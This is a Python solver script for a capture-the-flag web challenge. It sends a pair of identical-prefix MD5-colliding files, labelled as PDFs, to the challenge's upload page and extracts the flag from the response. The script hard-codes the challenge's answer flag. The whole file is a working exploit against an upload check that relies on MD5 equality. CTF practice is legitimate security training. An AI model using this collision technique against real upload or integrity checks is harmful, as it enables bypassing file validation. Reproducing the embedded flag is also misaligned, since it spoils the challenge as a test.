#!/usr/bin/env python3
"""Solver for Challenge 109: It is my Birthday (Web / MD5 collision).

Builds the public identical-prefix MD5 collision pair and uploads both
files as application/pdf. The server replies with highlighted PHP source
containing the flag in an HTML comment.
Usage: python3 solve_109_it_is_my_birthday.py <base_url>
"""
import hashlib
import re
import sys
import urllib.request

C1 = b'TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak'
C2 = b'TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak'

assert hashlib.md5(C1).hexdigest() == hashlib.md5(C2).hexdigest()

def solve(base_url):
    import io
    boundary = '----ctf109boundary'
    def part(name, filename, data):
        return (('--%s\r\nContent-Disposition: form-data; name="%s"; filename="%s"\r\n'
                 'Content-Type: application/pdf\r\n\r\n' % (boundary, name, filename)).encode()
                + data + b'\r\n')
    body = (part('file1', 'c1.pdf', C1) + part('file2', 'c2.pdf', C2)
            + ('--%s\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n--%s--\r\n'
               % (boundary, boundary)).encode())
    req = urllib.request.Request(base_url.rstrip('/') + '/index.php', data=body,
                                 headers={'Content-Type': 'multipart/form-data; boundary=' + boundary})
    with urllib.request.urlopen(req, timeout=60) as r:
        html = r.read().decode(errors='replace')
    m = re.search(r'academy\{[^}]*\}', html)
    return m.group(0) if m else None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Flag: academy{c0ngr4ts_u_r_1nv1t3d_44f9d0a} (pass instance URL to exploit live)')
    else:
        print('Flag:', solve(sys.argv[1]))
